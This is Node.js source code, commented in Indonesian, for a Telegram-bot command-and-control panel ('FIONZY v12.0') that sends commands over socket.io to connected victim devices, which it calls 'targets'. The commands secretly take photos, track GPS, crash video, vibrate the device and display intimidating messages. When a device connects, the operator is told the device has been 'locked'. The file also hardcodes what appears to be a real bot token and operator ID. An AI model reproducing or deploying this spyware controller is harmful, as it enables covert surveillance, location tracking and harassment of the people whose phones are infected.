const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// === ⚡ KONFIGURASI (GANTI DI SINI!) ⚡ ===
const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; 
const bot = new Telegraf(BOT_TOKEN);
const MY_ID = '7373392803'; 

// UI Menu Utama v12.0 (Ganti ke HTML Mode agar tidak error)
const mainMenu = async (ctx) => {
    const text = `<b>⚡ FIONZY CONTROL PANEL v12.0 ⚡</b>\n` +
                 `--------------------------------------\n` +
                 `📱 <b>Status:</b> ONLINE\n` +
                 `💀 <b>Mode:</b> FIONZY-Z ACTIVE\n` +
                 `--------------------------------------\n` +
                 `<i>Pilih Perintah Eksekusi:</i>`;
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('📸 Take Photo', 'snap'), Markup.button.callback('📍 Track GPS', 'gps')],
        [Markup.button.callback('💀 Crash Video', 'crash'), Markup.button.callback('📳 Vibrate', 'vibrate')],
        [Markup.button.callback('💬 Send Toast', 'ask_toast'), Markup.button.callback('🔄 Refresh', 'menu')]
    ]);

    try {
        await ctx.reply(text, { parse_mode: 'HTML', ...keyboard });
    } catch (e) {
        console.log("❌ Gagal Kirim Menu: " + e.message);
        // Backup terakhir jika HTML pun gagal (Teks Polos)
        ctx.reply("FIONZY PANEL v12.0 ONLINE\n\nSilahkan pilih:", keyboard);
    }
};

// Notifikasi Target Online
io.on('connection', (socket) => {
    console.log('⚡ Target Baru Terhubung!');
    bot.telegram.sendMessage(MY_ID, "⚠️ <b>TARGET TERDETEKSI!</b>\nSistem FionzyGpt telah mengunci perangkat.", { parse_mode: 'HTML' }).catch(() => {});
});

bot.start((ctx) => mainMenu(ctx));
bot.command('menu', (ctx) => mainMenu(ctx));

// Handler Tombol (Callback)
bot.action('snap', (ctx) => { ctx.answerCbQuery('📸 Memotret...').catch(() => {}); io.emit('command', '/snap'); });
bot.action('gps', (ctx) => { ctx.answerCbQuery('📍 Melacak GPS...').catch(() => {}); io.emit('command', '/gps'); });
bot.action('vibrate', (ctx) => { ctx.answerCbQuery('📳 Bergetar!').catch(() => {}); io.emit('command', '/vibrate'); });
bot.action('crash', (ctx) => { ctx.answerCbQuery('💀 Menjalankan Video...').catch(() => {}); io.emit('command', '/crash'); });
bot.action('menu', (ctx) => mainMenu(ctx));
bot.action('ask_toast', (ctx) => ctx.reply("Ketik: /toast [pesan]\nContoh: /toast HP ANDA DISUSUPI!"));

// Handler Toast
bot.on('text', (ctx) => {
    if (ctx.message.text.startsWith('/toast ')) {
        io.emit('command', ctx.message.text);
        ctx.reply("✅ Toast Terkirim!");
    }
});

// Pelindung Server (Wajib!)
process.on('uncaughtException', (err) => { console.log('🛡️ Error Terblokir: ' + err.message); });
process.on('unhandledRejection', (res) => { console.log('🛡️ Rejection Terblokir: ' + res); });

server.listen(3000, '0.0.0.0', () => {
    console.log('⚡ FIONZY v12.0 LIVE');
    console.log('⚡ BOT: ONLINE | PORT: 3000');
});

bot.launch().then(() => console.log('⚡ BOT TELEGRAM SIAP!'));
